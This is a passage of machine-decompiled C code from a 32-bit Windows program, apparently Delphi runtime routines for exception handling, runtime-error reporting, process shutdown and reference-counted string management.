    return result;
}

// Address range: 0x402bd2 - 0x402c00
int32_t function_402bd2(int32_t a1, int32_t a2) {
    int32_t v1; // 0x402bd2
    int32_t v2 = *(int32_t *)(v1 - 48); // 0x402bd8
    int32_t v3; // 0x402bd2
    int32_t v4; // 0x402bd2
    int32_t v5; // bp-4, 0x402bd2
    int32_t result; // 0x402bd2
    int32_t v6; // 0x402be3
    int32_t v7; // 0x402be6
    bool v8; // 0x402bd2
    uint16_t v9; // 0x402bdf
    int32_t v10; // 0x402bdf
    if (v2 != 0) {
        // 0x402bdf
        v9 = *(int16_t *)v2;
        v10 = v9;
        *(int32_t *)((int32_t)&v5 - 4) = v10;
        v6 = v2 + 2;
        v4 = v6;
        v3 = v10;
        if (v9 == 0) {
            // ._crit_edge
            if (v6 == 0) {
                // 0x402bf5
                return 2 * v10;
            }
        } else {
            v7 = v3 - 1;
            while (*(int16_t *)v4 != (int16_t)result) {
                // .lr.ph
                v4 += (v8 ? -2 : 2);
                if (v7 == 0) {
                    // break -> 0x402bec
                    break;
                }
                v7--;
            }
            // 0x402bf5
            return 2 * v10 - v7;
        }
    }
    int32_t v11 = *(int32_t *)(v1 - 36); // 0x402bec
    // 0x402bd2
    while (v11 != 0) {
        // 0x402bd6
        v1 = *(int32_t *)v11;
        v2 = *(int32_t *)(v1 - 48);
        if (v2 != 0) {
            // 0x402bdf
            v9 = *(int16_t *)v2;
            v10 = v9;
            *(int32_t *)((int32_t)&v5 - 4) = v10;
            v6 = v2 + 2;
            v4 = v6;
            v3 = v10;
            if (v9 == 0) {
                // ._crit_edge
                if (v6 == 0) {
                    // 0x402bf5
                    return 2 * v10;
                }
            } else {
                v7 = v3 - 1;
                while (*(int16_t *)v4 != (int16_t)result) {
                    // .lr.ph
                    v4 += (v8 ? -2 : 2);
                    if (v7 == 0) {
                        // break -> 0x402bec
                        break;
                    }
                    v7--;
                }
                // 0x402bf5
                return 2 * v10 - v7;
            }
        }
        // 0x402bec
        v11 = *(int32_t *)(v1 - 36);
    }
    // 0x402bf3
    return result;
}

// Address range: 0x402c02 - 0x402c08
int32_t function_402c02(void) {
    // 0x402c02
    return -0x7fff0001;
}

// Address range: 0x402c0a - 0x402c0b
int32_t function_402c0a(void) {
    // 0x402c0a
    int32_t result; // 0x402c0a
    return result;
}

// Address range: 0x402c0e - 0x402c0f
int32_t function_402c0e(void) {
    // 0x402c0e
    int32_t result; // 0x402c0e
    return result;
}

// Address range: 0x402c12 - 0x402c13
int32_t function_402c12(void) {
    // 0x402c12
    int32_t result; // 0x402c12
    return result;
}

// Address range: 0x402c16 - 0x402c3c
int32_t function_402c16(void) {
    // 0x402c16
    int32_t v1; // 0x402c16
    uint16_t v2 = (int16_t)v1;
    int32_t result; // 0x402c16
    if (v2 != 0 && v2 < 0xc000) {
        // 0x402c26
        int32_t v3; // 0x402c16
        function_402bd2(v3, result);
    }
    // 0x402c31
    return result;
}

// Address range: 0x402c3c - 0x402c3d
int32_t function_402c3c(void) {
    // 0x402c3c
    int32_t result; // 0x402c3c
    return result;
}

// Address range: 0x402c3e - 0x402c67
int32_t function_402c3e(void) {
    int32_t v1 = __readfsdword(0); // 0x402c51
    __writefsdword(0, (int32_t)&v1);
    int32_t result; // 0x402c3e
    return result;
}

// Address range: 0x402c67 - 0x402c6c
int32_t function_402c67(void) {
    int32_t result = function_402da6((int32_t)&g117, (int32_t)&g117, (int32_t)&g117); // 0x402c67
    return result;
}

// Address range: 0x402c6c - 0x402c8b
int32_t function_402c6c(int32_t a1) {
    // 0x402c6c
    if (*(int32_t *)(a1 + 12) != 0) {
        // 0x402c77
        function_402c8e();
    }
    // 0x402c85
    return function_402f0a((int32_t)&g117);
}

// Address range: 0x402c8e - 0x402c94
int32_t function_402c8e(void) {
    // 0x402c8e
    int32_t result; // 0x402c8e
    return result;
}

// Address range: 0x402c96 - 0x402ca4
int32_t function_402c96(void) {
    // 0x402c96
    int32_t result; // 0x402c96
    return result;
}

// Address range: 0x402ca6 - 0x402cb5
int32_t function_402ca6(void) {
    // 0x402ca6
    int32_t result; // 0x402ca6
    return result;
}

// Address range: 0x402cb6 - 0x402cd1
int32_t function_402cb6(void) {
    // 0x402cb6
    int32_t result; // 0x402cb6
    return result;
}

// Address range: 0x402cd2 - 0x402cf3
int32_t function_402cd2(void) {
    // 0x402cd2
    int32_t v1; // 0x402cd2
    return g15 == 0 ? v1 : 2;
}

// Address range: 0x402cf6 - 0x402d0b
int32_t function_402cf6(int32_t a1, int32_t a2) {
    // 0x402cf6
    return 0;
}

// Address range: 0x402d0e - 0x402d1f
int32_t function_402d0e(int32_t a1) {
    // 0x402d0e
    int32_t result; // 0x402d0e
    if ((unsigned char)g15 < 2) {
        // 0x402d1e
        return result;
    }
    // 0x402d17
    int32_t v1; // 0x402d0e
    return function_402cf6(result, v1);
}

// Address range: 0x402d22 - 0x402d40
int32_t function_402d22(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402d22
    int32_t result; // 0x402d22
    int32_t v1; // 0x402d22
    if (v1 == 0) {
        // 0x402d3f
        return result;
    }
    char v2 = v1;
    int32_t v3 = *(int32_t *)(v1 + 1); // 0x402d26
    result = v3;
    if (v2 != -23 && v2 == -21) {
        // 0x402d33
        result = 0x1000000 * v3 / 0x1000000;
    }
    // 0x402d3f
    return result;
}

// Address range: 0x402d42 - 0x402d69
int32_t function_402d42(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402d42
    int32_t result; // 0x402d42
    if ((unsigned char)g15 >= 2) {
        // 0x402d4b
        int32_t v1; // 0x402d42
        int32_t v2; // 0x402d42
        int32_t v3; // 0x402d42
        function_402d22(v3, v1, v2);
        int32_t v4; // bp-16, 0x402d42
        result = &v4;
    }
    // 0x402d68
    return result;
}

// Address range: 0x402d6a - 0x402d86
int32_t function_402d6a(void) {
    // 0x402d6a
    int32_t result; // 0x402d6a
    return result;
}

// Address range: 0x402d86 - 0x402da4
int32_t function_402d86(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402d86
    int32_t v1; // bp-8, 0x402d86
    int32_t * v2 = &v1; // 0x402d8f
    if ((unsigned char)g15 >= 2) {
        int32_t v3 = 0xeedfae3; // bp-24, 0x402d96
        v2 = &v3;
    }
    // 0x402da1
    return *(int32_t *)((int32_t)v2 + 4);
}

// Address range: 0x402da6 - 0x402ed0
int32_t function_402da6(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402da6
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402eca
        return 1;
    }
    int32_t v1 = *(int32_t *)a2; // 0x402db7
    int32_t v2 = *(int32_t *)(a2 + 24); // 0x402dc3
    int32_t v3; // 0x402da6
    if (v1 == 0xeedfade) {
        goto lab_0x402e33;
    } else {
        // 0x402dc5
        if (a2 == 0 || g40 == 0) {
            // 0x402eca
            return 1;
        }
        // 0x402de3
        v2 = a2;
        if (v1 == 0xeefface) {
            goto lab_0x402e33;
        } else {
            int32_t v4 = function_402cd2(); // 0x402df3
            v2 = v4;
            if (g16 != 0 == g15 == 0) {
                // 0x402e0a
                v3 = a3;
                if (v4 == 0) {
                    // 0x402eca
                    return 1;
                }
                goto lab_0x402e5a;
            } else {
                goto lab_0x402e33;
            }
        }
    }
  lab_0x402e33:
    // 0x402e33
    v3 = g16 > 1 == g15 == 0 ? v2 : a2;
    goto lab_0x402e5a;
  lab_0x402e5a:;
    int32_t * v5 = (int32_t *)(v3 + 4); // 0x402e5a
    *v5 = *v5 | 2;
    __readfsdword(0);
    int32_t * v6 = (int32_t *)function_4043be(); // 0x402e87
    int32_t v7 = *v6; // bp-56, 0x402e87
    *v6 = (int32_t)&v7;
    int32_t v8; // 0x402da6
    *(int32_t *)(v8 + 4) = 0x402eaa;
    return function_402d0e(v7);
}

// Address range: 0x402ed2 - 0x402f08
int32_t function_402ed2(int32_t a1, int32_t a2) {
    // 0x402ed2
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402ee3
        *(int32_t *)(a1 + 4) = 0x402f02;
        int32_t v1; // 0x402ed2
        int32_t v2; // 0x402ed2
        int32_t v3; // 0x402ed2
        int32_t v4; // 0x402ed2
        function_402d42(v4, v2, v1, v3);
    }
    // 0x402f02
    return 1;
}

// Address range: 0x402f0a - 0x402f5b
int32_t function_402f0a(int32_t a1) {
    // 0x402f0a
    *(int32_t *)(a1 + 4) = 0x402f55;
    int32_t * v1 = (int32_t *)function_4043be(); // 0x402f1a
    int32_t v2 = *v1; // 0x402f1a
    *v1 = *(int32_t *)v2;
    int32_t v3 = *(int32_t *)(v2 + 12); // 0x402f28
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402f2b
    *v4 = *v4 & -3;
    if (*(int32_t *)v3 != 0xeedfade) {
        // 0x402f37
        function_402cb6();
    }
    // 0x402f44
    int32_t v5; // 0x402f0a
    *(int32_t *)v5 = *(int32_t *)__readfsdword(0);
    return 1;
}

// Address range: 0x402f5e - 0x402f8d
int32_t function_402f5e(int32_t a1) {
    int32_t * v1 = (int32_t *)function_4043be(); // 0x402f63
    *v1 = *(int32_t *)*v1;
    __writefsdword(0, *(int32_t *)a1);
    return function_402d6a();
}

// Address range: 0x402f8d - 0x402f8e
int32_t function_402f8d(void) {
    // 0x402f8d
    int32_t result; // 0x402f8d
    return result;
}

// Address range: 0x402f8e - 0x402fa3
int32_t function_402f8e(int32_t a1, int32_t result) {
    // 0x402f8e
    __writefsdword(0, result);
    return result;
}

// Address range: 0x402fa3 - 0x402fa4
int32_t function_402fa3(void) {
    // 0x402fa3
    int32_t result; // 0x402fa3
    return result;
}

// Address range: 0x402fa6 - 0x403042
int32_t function_402fa6(int32_t a1) {
    // 0x402fa6
    function_402696();
    // UNREACHABLE
}

// Address range: 0x403042 - 0x403046
int32_t function_403042(int32_t a1) {
    // 0x403042
    int32_t result; // 0x403042
    return result;
}

// Address range: 0x403046 - 0x4030e3
int32_t function_403046(int32_t a1, int32_t a2) {
    // 0x403046
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x4030e0
        return 0;
    }
    // 0x403057
    if (g40 == 0) {
        function_402fa6((int32_t)&g117);
        // UNREACHABLE
    }
    // 0x4030bb
    function_402d86(0, a2, a1);
    function_4034b2((int32_t)&g40);
    // UNREACHABLE
}

// Address range: 0x4030e6 - 0x403103
int32_t function_4030e6(void) {
    // 0x4030e6
    int32_t v1; // 0x4030e6
    int32_t result = v1 - 12; // 0x4030e8
    int32_t v2 = __readfsdword(0); // 0x4030eb
    __writefsdword(0, result);
    *(int32_t *)result = v2;
    *(int32_t *)(v1 - 8) = 0x403046;
    g75 = result;
    return result;
}

// Address range: 0x403106 - 0x40312e
int32_t function_403106(void) {
    // 0x403106
    if (g75 == 0) {
        // 0x40312d
        return 0;
    }
    int32_t v1 = __readfsdword(0); // 0x403111
    int32_t v2 = v1; // 0x403116
    if (g75 == v1) {
        int32_t result = *(int32_t *)g75; // 0x403118
        __writefsdword(0, result);
        return result;
    }
    int32_t result2 = g75; // 0x403123
    while (v2 != -1) {
        int32_t * v3 = (int32_t *)v2;
        v2 = *v3;
        if (v2 == g75) {
            // 0x403129
            result2 = *(int32_t *)g75;
            *v3 = result2;
            return result2;
        }
        result2 = g75;
    }
  lab_0x40312d:
    // 0x40312d
    return result2;
}

// Address range: 0x40312e - 0x40318d
int32_t function_40312e(void) {
    // 0x40312e
    if (g76 == 0) {
        // 0x403188
        return 0;
    }
    int32_t v1 = __readfsdword(0); // bp-28, 0x40314e
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g77; // 0x403156
    if (g77 < 1) {
        // 0x40316a
        __writefsdword(0, v1);
        // 0x403188
        return 0;
    }
    v2--;
    while (v2 >= 0 == (v2 != 0)) {
        // 0x403158
        v2--;
    }
    // 0x40316a
    g77 = v2;
    // 0x40316a
    __writefsdword(0, v1);
    // 0x403188
    return 0;
}

// Address range: 0x40318e - 0x4031ed
int32_t function_40318e(int32_t a1) {
    // 0x40318e
    if (g76 == 0) {
        // 0x4031e8
        return 0;
    }
    uint32_t v1 = *(int32_t *)g76; // 0x40319d
    int32_t v2 = __readfsdword(0); // bp-28, 0x4031ac
    __writefsdword(0, (int32_t)&v2);
    if (v1 >= 1) {
        // 0x4031b6
        g77 = v1;
    }
    // 0x4031ca
    __writefsdword(0, v2);
    // 0x4031e8
    return 0;
}

// Address range: 0x4031ee - 0x4032b5
int32_t function_4031ee(int32_t a1) {
    // 0x4031ee
    int32_t v1; // 0x4031ee
    char * v2 = (char *)(v1 - 60); // 0x4031fe
    __asm_rep_movsd_memcpy(v2, (char *)&g74, 11);
    g74 = v2;
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x40322e
    int32_t v4; // 0x4031ee
    g77 = *v3 != 0 ? 0 : v4;
    g41 = 0x4011b6;
    g42 = 0x4011be;
    function_4030e6();
    g79 = (char)*v3 + 1;
    if (g43 == 0) {
        // 0x403296
        *(char *)&g45 = 1;
    }
    // 0x4032a3
    if (*v3 == 1) {
        // 0x4032ad
        int32_t v5; // 0x4031ee
        return function_40318e(v5);
    }
    function_4033ce();
    // UNREACHABLE
}

// Address range: 0x4032b5 - 0x4032b6
int32_t function_4032b5(void) {
    // 0x4032b5
    int32_t result; // 0x4032b5
    return result;
}

// Address range: 0x4032b6 - 0x403310
int32_t function_4032b6(void) {
    int32_t v1 = 16; // 0x4032c0
    int32_t v2 = g8;
    int64_t v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2; // 0x4032ce
    *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
    int32_t v4 = v3 / 10; // 0x4032e2
    v1--;
    while (v4 != 0) {
        // 0x4032c6
        v2 = v4;
        v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2;
        *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
        v4 = v3 / 10;
        v1--;
    }
    int32_t v5 = 28; // 0x4032ed
    uint32_t v6 = g9;
    char v7 = *(char *)((v6 & 15) + (int32_t)&g20); // 0x4032f7
    *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
    int32_t result = v6 / 16; // 0x403304
    v5--;
    while (v6 >= 16) {
        // 0x4032f2
        v6 = result;
        v7 = *(char *)((v6 & 15) + (int32_t)&g20);
        *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
        result = v6 / 16;
        v5--;
    }
    // 0x40330c
    return result;
}

// Address range: 0x403312 - 0x40333f
int32_t function_403312(void) {
    int32_t v1 = g8; // 0x403314
    g8 = 0;
    __asm_rep_movsd_memcpy((char *)&g74, g74, 11);
    return v1 == 0;
}

// Address range: 0x40333f - 0x403340
int32_t function_40333f(void) {
    // 0x40333f
    int32_t result; // 0x40333f
    return result;
}

// Address range: 0x403342 - 0x4033c1
int32_t function_403342(void) {
    // 0x403342
    if (g49 != 0) {
        // 0x40334c
        int32_t v1; // bp-28, 0x403342
        return &v1;
    }
    // 0x4033a3
    int32_t result; // 0x403342
    if (g17 == 0) {
        // 0x4033ac
        int32_t hWnd; // 0x403342
        result = MessageBoxA((int32_t *)hWnd, NULL, "Error", (int32_t)"Runtime error     at 00000000");
    }
    // 0x4033bf
    return result;
}

// Address range: 0x4033ce - 0x4034a1
int32_t function_4033ce(void) {
    // 0x4033ce
    if (g79 == 0 && g48 != 0) {
        // 0x4033ec
        g48 = 0;
    }
    // 0x4033fd
    if (g9 != 0) {
        // 0x403406
        function_4032b6();
        function_403342();
        g9 = 0;
    }
    // 0x403417
    int32_t v1; // bp-16, 0x4033ce
    int32_t v2 = &v1;
    int32_t v3 = &g8; // 0x40349b
    int32_t v4; // 0x4033ce
    int32_t v5; // 0x4033ce
    int32_t v6; // 0x4033ce
    while (true) {
      lab_0x403417:
        // 0x403417
        v4 = v3;
        v5 = v2;
        if (g79 == 2) {
            // 0x40341d
            if (*(int32_t *)v4 == 0) {
                // 0x403422
                g77 = 0;
            }
        }
        // 0x403427
        function_40312e();
        if (g79 < 2) {
            goto lab_0x403437;
        } else {
            // 0x403432
            v6 = v5;
            if (*(int32_t *)v4 == 0) {
                goto lab_0x403458;
            } else {
                goto lab_0x403437;
            }
        }
    }
  lab_0x403476:
    // 0x403476
    *(int32_t *)(v2 - 4) = *(int32_t *)v4;
    ExitProcess((int32_t)&g117);
    // UNREACHABLE
  lab_0x403437:
    // 0x403437
    v6 = v5;
    if (g78 != 0) {
        // 0x40343e
        function_40406e();
        int32_t v7 = *(int32_t *)(g78 + 16); // 0x403446
        v6 = v5;
        if (!((v7 == 0 | v7 == *(int32_t *)(g78 + 4)))) {
            int32_t v8 = v5 - 4; // 0x403452
            *(int32_t *)v8 = v7;
            FreeLibrary(&g117);
            v6 = v8;
        }
    }
    goto lab_0x403458;
  lab_0x403458:
    // 0x403458
    v2 = v6;
    function_403106();
    if (g79 != 0) {
        // 0x40346c
        function_403312();
    }
    // 0x403471
    if (g74 == NULL) {
        // break -> 0x403476
        goto lab_0x403476;
    }
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x40348f
    *v9 = v4;
    __asm_rep_movsd_memcpy((char *)&g74, g74, 11);
    v3 = *v9;
    goto lab_0x403417;
}

// Address range: 0x4034a1 - 0x4034a6
int32_t function_4034a1(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4034a1
    int32_t result; // 0x4034a1
    return result;
}

// Address range: 0x4034a6 - 0x4034b0
int32_t function_4034a6(void) {
    // 0x4034a6
    function_4033ce();
    // UNREACHABLE
}

// Address range: 0x4034b0 - 0x4034b1
int32_t function_4034b0(void) {
    // 0x4034b0
    int32_t result; // 0x4034b0
    return result;
}

// Address range: 0x4034b2 - 0x4034bd
int32_t function_4034b2(int32_t a1) {
    // 0x4034b2
    g9 = a1;
    return function_4034a6();
}

// Address range: 0x4034bd - 0x4034be
int32_t function_4034bd(void) {
    // 0x4034bd
    int32_t result; // 0x4034bd
    return result;
}

// Address range: 0x4034be - 0x4034e1
int32_t function_4034be(void) {
    // 0x4034be
    int32_t result; // 0x4034be
    if (result == 0) {
        // 0x4034e0
        return result;
    }
    // 0x4034c4
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x4034ca
    int32_t v2 = *v1; // 0x4034ca
    if (v2 < 1) {
        // 0x4034e0
        return result;
    }
    int32_t v3 = v2 - 1; // 0x4034d0
    *v1 = v3;
    if (v3 == 0) {
        // 0x4034d6
        function_402626();
    }
    // 0x4034e0
    return result;
}

// Address range: 0x4034e2 - 0x403511
int32_t function_4034e2(void) {
    int32_t v1; // 0x4034e2
    int32_t * v2 = (int32_t *)v1; // 0x4034e8
    int32_t v3 = *v2; // 0x4034e8
    int32_t v4; // 0x4034e2
    int32_t v5 = v4; // 0x4034ec
    int32_t * v6; // 0x4034f4
    uint32_t v7; // 0x4034f4
    int32_t v8; // 0x4034fa
    if (v3 != 0) {
        // 0x4034ee
        *v2 = 0;
        v6 = (int32_t *)(v3 - 8);
        v7 = *v6;
        v5 = v4;
        if (v7 >= 1) {
            // 0x4034fa
            v8 = v7 - 1;
            *v6 = v8;
            v5 = v4;
            if (v8 == 0) {
                // 0x403500
                v5 = function_402626();
            }
        }
    }
    int32_t result = v5;
    int32_t v9; // 0x4034e2
    int32_t v10 = v9 - 1; // 0x40350b
    v1 += 4;
    while (v10 != 0) {
        int32_t v11 = result;
        v2 = (int32_t *)v1;
        v3 = *v2;
        v5 = v11;
        if (v3 != 0) {
            // 0x4034ee
            *v2 = 0;
            v6 = (int32_t *)(v3 - 8);
            v7 = *v6;
            v5 = v11;
            if (v7 >= 1) {
                // 0x4034fa
                v8 = v7 - 1;
                *v6 = v8;
                v5 = v11;
                if (v8 == 0) {
                    // 0x403500
                    v5 = function_402626();
                }
            }
        }
        // 0x403508
        result = v5;
        v10--;
        v1 += 4;
    }
    // 0x40350e
    return result;
}

// Address range: 0x403512 - 0x403555
int32_t function_403512(void) {
    int32_t v1 = 0; // 0x403514
    int32_t v2; // 0x403512
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)(v2 - 8); // 0x403516
        int32_t v4 = *v3; // 0x403516
        int32_t v5 = v4 + 1; // 0x403519
        if (v5 < 0 == (v5 & (v4 ^ -0x80000000)) < 0 == (v5 != 0)) {
            // 0x403536
            *v3 = v5;
        } else {
            // 0x40351c
            v1 = function_403556();
            function_40270a();
        }
    }
    // 0x40353a
    int32_t v6; // 0x403512
    *(int32_t *)v6 = v1;
    int32_t result = 0; // 0x40353e
    if (v6 == 0) {
        // 0x403554
        return result;
    }
    int32_t * v7 = (int32_t *)(v6 - 8); // 0x403540
    int32_t v8 = *v7; // 0x403540
    if (v8 < 1) {
        // 0x403554
        return result;
    }
    int32_t v9 = v8 - 1; // 0x403546
    *v7 = v9;
    if (v9 == 0) {
        // 0x40354c
        result = function_402626();
    }
    // 0x403554
    return result;
}

// Address range: 0x403556 - 0x403581
int32_t function_403556(void) {
    // 0x403556
    int32_t v1; // 0x403556
    if (v1 < 1) {
        // 0x40357e
        return 0;
    }
    int32_t v2 = function_402606(); // 0x403562
    *(int16_t *)(v2 + (v1 + 8 & -2)) = 0;
    *(int32_t *)v2 = 1;
    return v2 + 8;
}

// Address range: 0x403582 - 0x4035b0
int32_t function_403582(void) {
    int32_t v1 = function_403556(); // 0x40358d
    int32_t v2; // 0x403582
    if (v2 != 0) {
        // 0x40359a
        function_40270a();
    }
    int32_t result = function_4034be(); // 0x4035a5
    int32_t v3; // 0x403582
    *(int32_t *)v3 = v1;
    return result;
}

// Address range: 0x4035b2 - 0x4035c1
int32_t function_4035b2(void) {
    // 0x4035b2
    return function_403582();
}

// Address range: 0x4035c2 - 0x4035ee
int32_t function_4035c2(void) {
    // 0x4035c2
    int32_t v1; // 0x4035c2
    if (v1 == 0 || *(char *)v1 == 0) {
        // 0x4035e9
        return function_403582();
    }
    int32_t v2; // 0x4035c2
    while (*(char *)(v2 + 1) != 0) {
        // 0x4035d2
        if (*(char *)(v2 + 2) == 0) {
            // break -> 0x4035e9
            break;
        }
        // 0x4035d7
        if (*(char *)(v2 + 3) == 0) {
            // break -> 0x4035e9
            break;
        }
        int32_t v3 = v2 + 4; // 0x4035dc
        v2 = v3;
        if (*(char *)v3 == 0) {
            // break -> 0x4035e9
            break;
        }
    }
    // 0x4035e9
    return function_403582();
}

// Address range: 0x4035ee - 0x4035ef
int32_t function_4035ee(void) {
    // 0x4035ee
    int32_t result; // 0x4035ee
    return result;
}

// Address range: 0x4035f2 - 0x4035fc
int32_t function_4035f2(void) {
    // 0x4035f2
    return function_403582();
}

// Address range: 0x4035fc - 0x4035fd
int32_t function_4035fc(void) {
    // 0x4035fc
    int32_t result; // 0x4035fc
    return result;
}

// Address range: 0x4035fe - 0x403615
int32_t function_4035fe(void) {
    // 0x4035fe
    return function_403582();
}

// Address range: 0x403615 - 0x403616
int32_t function_403615(void) {
    // 0x403615
    int32_t result; // 0x403615
    return result;
}

// Address range: 0x403616 - 0x40361e
int32_t function_403616(void) {
    int32_t result = 0; // 0x403618
    int32_t v1; // 0x403616
    if (v1 != 0) {
        // 0x40361a
        result = *(int32_t *)(v1 - 4);
    }
    // 0x40361d
    return result;
}

// Address range: 0x40361e - 0x403662
int32_t function_40361e(void) {
    // 0x40361e
    int32_t v1; // 0x40361e
    int32_t result; // 0x40361e
    if (v1 == 0) {
        // 0x403661
        return result;
    }
    if (result == 0) {
        function_403512();
    }
    // 0x40362c
    function_4039a2();
    return function_40270a();
}

// Address range: 0x403662 - 0x4036d5
int32_t function_403662(void) {
    // 0x403662
    int32_t v1; // 0x403662
    if (v1 == 0) {
        // 0x4036c7
        return function_403512();
    }
    int32_t v2; // 0x403662
    int32_t v3; // 0x403662
    if (v3 == 0) {
        v2 = function_403512();
    }
    // 0x40366e
    if (v1 == v2) {
        // 0x4036ce
        return function_40361e();
    }
    if (v3 != v2) {
        // 0x403676
        function_403512();
        return function_40361e();
    }
    int32_t v4 = function_403556(); // 0x403692
    function_40270a();
    function_40270a();
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)(v4 - 8); // 0x4036bb
        *v5 = *v5 - 1;
    }
    // 0x4036be
    return function_403512();
}

// Address range: 0x4036d5 - 0x4036d6
int32_t function_4036d5(void) {
    // 0x4036d5
    int32_t result; // 0x4036d5
    return result;
}

// Address range: 0x4036d6 - 0x40375f
int32_t function_4036d6(int32_t result) {
    // 0x4036d6
    int32_t v1; // bp-20, 0x4036d6
    int32_t v2 = (int32_t)&v1 + 20; // 0x4036df
    int32_t v3; // 0x4036d6
    int32_t v4 = *(int32_t *)(v2 + 4 * v3); // 0x4036df
    int32_t v5; // 0x4036d6
    int32_t v6 = v3 + (int32_t)!((v4 == 0 | v5 != v4)); // 0x403706
    int32_t v7 = v4 == 0 | v5 != v4 ? 0 : v4;
    int32_t v8 = *(int32_t *)(4 * v6 + v2); // 0x4036f5
    int32_t v9 = v7; // 0x4036fb
    if (v8 != 0) {
        // 0x4036fd
        v9 = v7 != v8 ? v7 : 0;
    }
    int32_t v10 = v9;
    v6--;
    while (v6 != 0) {
        // 0x4036f5
        v7 = v10;
        v8 = *(int32_t *)(4 * v6 + v2);
        v9 = v7;
        if (v8 != 0) {
            // 0x4036fd
            v9 = v7 != v8 ? v7 : 0;
        }
        // 0x403706
        v10 = v9;
        v6--;
    }
    int32_t v11; // 0x4036d6
    int32_t v12; // 0x4036d6
    int32_t v13; // bp-24, 0x4036d6
    if (v10 == 0) {
        // 0x403724
        v13 = function_403556();
        v12 = 0;
    } else {
        // 0x40370d
        v13 = function_4039a2();
        v11 = v3 - 1;
        v12 = v1;
    }
    int32_t v14 = v11; // 0x403740
    if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
        // 0x403736
        function_40270a();
    }
    // 0x403740
    v14--;
    while (v14 != 0) {
        // 0x40372c
        if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
            // 0x403736
            function_40270a();
        }
        // 0x403740
        v14--;
    }
    if (v12 != 0) {
        // 0x403755
        return result;
    }
    // 0x403749
    if (v13 != 0) {
        int32_t * v15 = (int32_t *)(v13 - 8); // 0x40374d
        *v15 = *v15 - 1;
    }
    // 0x403750
    function_403512();
    // 0x403755
    return result;
}

// Address range: 0x40375f - 0x403760
int32_t function_40375f(void) {
    // 0x40375f
    int32_t result; // 0x40375f
    return result;
}

// Address range: 0x403762 - 0x403804
int32_t function_403762(void) {
    // 0x403762
    int32_t v1; // 0x403762
    int32_t v2; // 0x403762
    if (v2 == v1) {
        // 0x4037eb
        int32_t result; // 0x403762
        return result;
    }
    if (v2 == 0) {
        // 0x4037eb
        return -*(int32_t *)(v1 - 4);
    }
    uint32_t result2 = *(int32_t *)(v2 - 4);
    if (v1 == 0) {
        // 0x4037eb
        return result2;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x40377c
    int32_t result3 = result2 - v3; // 0x40377f
    uint32_t v4 = result2 < v3 | result3 == 0 ? result2 : v3;
    int32_t v5 = v4 / 4; // 0x403789
    int32_t v6; // 0x403762
    int32_t v7; // 0x403762
    if (v4 < 4) {
        goto lab_0x4037b1;
      lab_0x4037b1:;
        int32_t v8 = v4 & 3; // 0x4037b2
        if (v8 == 0) {
            // 0x4037eb
            return 2 * result3;
        }
        uint32_t v9 = *(int32_t *)v7; // 0x4037b7
        uint32_t v10 = *(int32_t *)v6; // 0x4037b9
        if ((char)v9 != (char)v10) {
            // 0x4037eb
            return result3;
        }
        int32_t v11 = v8 - 1; // 0x4037bf
        if (v11 == 0) {
            // 0x4037eb
            return 2 * result3;
        }
        // 0x4037c2
        if ((char)(v9 / 256) != (char)(v10 / 256)) {
            // 0x4037eb
            return result3;
        }
        if (v11 == 1) {
            // 0x4037eb
            return 2 * result3;
        }
        // 0x4037c9
        if (((v10 ^ v9) & 0xff0000) != 0) {
            // 0x4037eb
            return result3;
        }
        // 0x4037eb
        return 2 * result3;
    }
    int32_t v12; // 0x403762
    int32_t v13 = v12;
    int32_t v14; // 0x403762
    while (*(int32_t *)v14 == *(int32_t *)v13) {
        int32_t v15 = v14 + 4;
        if (v5 == 1) {
            // 0x4037ab
            v7 = v15;
            v6 = v13 + 4;
            goto lab_0x4037b1;
        }
        // 0x403796
        if (*(int32_t *)v15 != *(int32_t *)(v13 + 4)) {
            // break -> 0x4037eb
            break;
        }
        int32_t v16 = v14 + 8; // 0x4037a0
        int32_t v17 = v13 + 8; // 0x4037a3
        v5 -= 2;
        v14 = v16;
        v7 = v16;
        v6 = v17;
        if (v5 == 0) {
            goto lab_0x4037b1;
        }
        v13 = v17;
    }
    // 0x4037eb
    return result3;
}

// Address range: 0x403806 - 0x403815
int32_t function_403806(void) {
    // 0x403806
    int32_t result; // 0x403806
    if (result == 0) {
        // 0x403814
        return result;
    }
    int32_t * v1 = (int32_t *)(result - 8); // 0x40380a
    uint32_t v2 = *v1 + 1; // 0x40380d
    if (v2 >= 1) {
        // 0x403810
        *v1 = v2;
    }
    // 0x403814
    return result;
}

// Address range: 0x403816 - 0x403822
int32_t function_403816(void) {
    // 0x403816
    int32_t v1; // 0x403816
    return v1 == 0 ? 0x40381b : v1;
}

// Address range: 0x403822 - 0x403863
int32_t function_403822(void) {
    // 0x403822
    int32_t v1; // 0x403822
    if (v1 == 0 || *(int32_t *)(v1 - 8) == 1) {
        // 0x403860
        return 0;
    }
    int32_t result = function_403556(); // 0x403834
    *(int32_t *)v1 = result;
    function_40270a();
    int32_t * v2 = (int32_t *)(result - 8); // 0x403849
    int32_t v3 = *v2; // 0x403849
    if (v3 < 1) {
        // 0x403860
        return result;
    }
    int32_t v4 = v3 - 1; // 0x40384f
    *v2 = v4;
